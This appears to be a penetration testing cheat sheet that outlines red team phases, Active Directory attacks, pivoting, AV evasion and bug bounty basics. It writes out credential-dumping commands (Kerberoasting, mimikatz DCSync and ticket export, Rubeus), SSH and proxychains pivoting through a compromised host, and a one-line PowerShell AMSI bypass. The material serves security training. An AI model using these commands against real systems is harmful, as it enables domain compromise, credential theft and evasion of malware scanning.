# Penetration Testing — Advanced

## Red Team Operations

```
Red Team ≠ Pen Test

Pen Test:   Point-in-time, specific scope, finds as many vulns as possible
Red Team:   Long campaign, specific objective (e.g., "exfiltrate customer data"),
            tests detection and response capability (not just vulnerabilities)

Red Team phases:
  Initial Access → Persistence → Privilege Escalation →
  Lateral Movement → Collection → Exfiltration

TTPs (Tactics, Techniques, Procedures) mapped to MITRE ATT&CK framework
Goal: behave like a real APT group to test if blue team detects you
```

## Active Directory Attacks

```bash
# Kerberoasting: request TGS for service accounts, crack offline
# GetUserSPNs.py domain/user:password -dc-ip DC-IP -request
# hashcat -m 13100 hashes.txt wordlist.txt

# Pass-the-Ticket
# mimikatz: sekurlsa::tickets /export
# Rubeus.exe ptt /ticket:BASE64_TICKET

# DCSync: dump all domain hashes (needs Domain Admin or equivalent)
# mimikatz: lsadump::dcsync /domain:corp.local /all

# BloodHound: visualize AD attack paths
# SharpHound.exe -c All  → collect data
# BloodHound (Neo4j) → visualize shortest path to Domain Admin
```

## Post-Exploitation and Pivoting

```bash
# Establish persistence
# Linux: crontab, systemd service, .bashrc
# Windows: registry run keys, scheduled tasks, WMI subscriptions

# Port forwarding / pivoting
# SSH local forward: access internal service through compromised host
ssh -L 3306:internal-db:3306 compromised-host

# SOCKS proxy through compromised host
ssh -D 1080 compromised-host
# Then: proxychains nmap -sT -p 80,443 internal-network/24

# Metasploit pivoting
# use post/multi/manage/shell_to_meterpreter
# route add 10.0.0.0/24 SESSION_ID
```

## Evasion Techniques

```bash
# AV evasion: encode payloads, use HTTPS C2, living-off-the-land binaries
# Process injection: inject shellcode into legitimate processes
# Fileless malware: run entirely in memory (PowerShell, WMI)

# AMSI bypass (Windows Antimalware Scan Interface)
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscation: Invoke-Obfuscation, PyFuscation
# C2 frameworks: Cobalt Strike, Havoc, Sliver (open source)
```

## Bug Bounty Programs

```
Top platforms:
  HackerOne (hackerone.com)
  Bugcrowd (bugcrowd.com)
  Synack (invite-only, paid)
  Intigriti (European focus)

Scope types:
  In-scope:  Specific domains/IPs you can test
  Out-scope: Production databases, third-party services, DoS attacks

Best targets for beginners:
  - Web applications (SQLi, XSS, IDOR, SSRF)
  - API endpoints
  - Authentication flows

Tips:
  - Read the program policy carefully
  - Test on staging if available
  - Always document with screenshots and HTTP traffic
  - Responsible disclosure: report immediately, don't exploit further
```
